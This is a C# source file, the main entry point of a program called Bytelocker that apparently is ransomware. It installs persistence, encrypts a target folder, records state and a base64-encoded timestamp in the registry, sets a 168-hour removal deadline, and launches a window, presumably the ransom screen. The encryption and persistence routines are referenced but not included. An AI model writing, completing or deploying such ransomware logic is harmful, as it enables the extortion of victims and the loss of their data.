using System;
using System.Windows.Forms;
using Bytelocker.CryptoManager;
using Bytelocker.Installer;
using Bytelocker.Settings;
using Bytelocker.Tools;
using Bytelocker.UI;

namespace Bytelocker
{
    internal class Bytelocker
    {
        private static readonly RegistryManager rm = new RegistryManager();

        // max hours should be 99 days
        public static int TIME_TILL_REMOVAL_HOURS = 168;

        public static void Main(string[] args)
        {
            Install();

            Encrypt();

            // if no files have been encrypted, uninstall
            if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
                Uninstall();
            else
                LaunchWindow();
        }

        private static void Encrypt()
        {
            if (!rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown"))
            {
                var cmh = new CryptoManagerMainHandler();
                cmh.EncryptFolder(@"TEST_FOLDER_HERE");
            }
        }

        public static void Decrypt()
        {
            var cmh = new CryptoManagerMainHandler();
            cmh.DecryptAll();
        }

        public static void Uninstall()
        {
            new Uninstall();
        }

        private static void Install()
        {
            new Persistence();
        }


        [STAThread]
        private static void LaunchWindow()
        {
            rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", true);

            if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "t") == "none")
                rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "t",
                    B64Manager.ToBase64(DateTime.Now.ToString()));

            var mw = new MainWindow();
            Application.EnableVisualStyles();
            Application.Run(mw);
        }
    }
}